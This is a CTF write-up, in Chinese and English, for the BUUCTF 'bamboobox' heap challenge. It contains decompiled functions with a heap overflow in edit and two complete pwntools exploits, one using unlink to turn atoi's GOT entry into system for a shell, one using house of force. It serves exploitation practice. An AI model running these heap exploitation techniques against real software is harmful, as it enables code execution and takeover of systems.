# BUU-hitcontraining_bamboobax

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**show**

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", (unsigned int)i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}
```

**add**

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

**edit**

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**delete**

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

在`edit`有溢出，有一个管理堆块的数组，首先想到`unlink`。

这里还有一种方法，利用`house_of_force`。在开始申请了一个0x10的chunk，用来放`hello_messsage`和`goodbye_message`函数的地址，我们通过`house_of_force`将`top chunk`迁移到这个chunk附近，从而修改其中的内容。但是由于buu不提供题目靶机环境复现，所以这种方法只能用来练习。

## exp

**unlink**

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./bamboobox'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27159)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def show():
    sh.sendline("1")

def add(size,content):
    sh.sendline("2")
    sh.sendafter("Please enter the length of item name:",str(size))
    sh.sendafter('Please enter the name of item:',str(content))

def edit(index, size, content):
    sh.sendline("3")
    sh.sendlineafter('Please enter the index of item:',str(index))
    sh.sendafter('Please enter the length of item name:',str(size))
    sh.sendafter('Please enter the new name of the item:',str(content))
    
def free(index):
    sh.sendline('4')
    sh.sendlineafter('Please enter the index of item:',str(index))

array = 0x6020C8
atoi_got = elf.got['atoi']

add(0x40,'a'*0x40) #0
add(0x80,'b'*0x80) #1
add(0x40,'c'*0x40) #2
add(0x10,'/bin/sh\x00\x00\x00')	#4
#gdb.attach(sh)
payload = p64(0)+p64(0x41)+p64(array-0x18)+p64(array-0x10)
payload=payload.ljust(0x40,'n')
payload+=p64(0x40)+p64(0x90)
edit(0,0x80,payload)
#gdb.attach(sh)
free(1)    
payload = p64(0x40)*3+p64(atoi_got)
edit(0,0x80,payload)
show()

atoi_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('atoi',atoi_addr)
libc = LibcSearcher('atoi',atoi_addr)
libcbase = atoi_addr-libc.dump('atoi')
system = libcbase+libc.dump('system')
edit(0,0x80,p64(system))
sh.sendline('/bin/sh\x00')

sh.interactive()
```

**house_of_force**

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=1
binary='./bamboobox'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27159)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def show():
    sh.sendline("1")

def add(size,content):
    sh.sendline("2")
    sh.sendafter("Please enter the length of item name:",str(size))
    sh.sendafter('Please enter the name of item:',str(content))

def edit(index, size, content):
    sh.sendline("3")
    sh.sendlineafter('Please enter the index of item:',str(index))
    sh.sendafter('Please enter the length of item name:',str(size))
    sh.sendafter('Please enter the new name of the item:',str(content))
    
def free(index):
    sh.sendline('4')
    sh.sendlineafter('Please enter the index of item:',str(index))

array = 0x6020C8
magic = 0x400D49
atoi_got = elf.got['atoi']

add(0x30,'a'*0x30) #0

payload='a'*0x30+p64(0)+'\xff'*8
edit(0,0x80,payload)

offset = -(0x60+0x8+0xf)
#gdb.attach(sh)
add(offset,'a\n')#1
add(0x10,'a\n')
edit(2,0x10,p64(magic)*2)
sh.sendline('5')

sh.interactive()
```

